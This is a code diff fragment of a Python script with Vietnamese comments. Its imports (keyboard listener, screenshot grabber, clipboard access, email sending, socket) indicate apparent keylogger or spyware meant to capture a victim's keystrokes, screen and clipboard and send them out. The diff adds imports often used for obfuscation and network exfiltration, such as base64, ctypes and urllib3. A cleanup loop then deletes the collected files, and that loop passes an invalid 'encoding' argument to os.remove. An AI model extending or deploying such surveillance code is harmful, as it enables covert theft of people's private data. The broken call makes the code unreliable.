@@ -30,7 +30,6 @@ install_required_libraries()
 import os
 import pyscreenshot as ImageGrab
 from pynput.keyboard import Key, Listener
-from scipy.io.wavfile import write
 import win32clipboard
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -41,6 +40,12 @@ import socket
 import platform
 import time
 import subprocess
+import ctypes
+import sys
+import base64
+import random
+import shutil
+from urllib3 import PoolManager
 
 
 # Danh sách tên file
@@ -262,3 +267,4 @@ time.sleep(120)  # Tạm dừng
 # Giải phóng file
 for file in file_names:
     os.remove(file_path + file, encoding='utf-8')
+
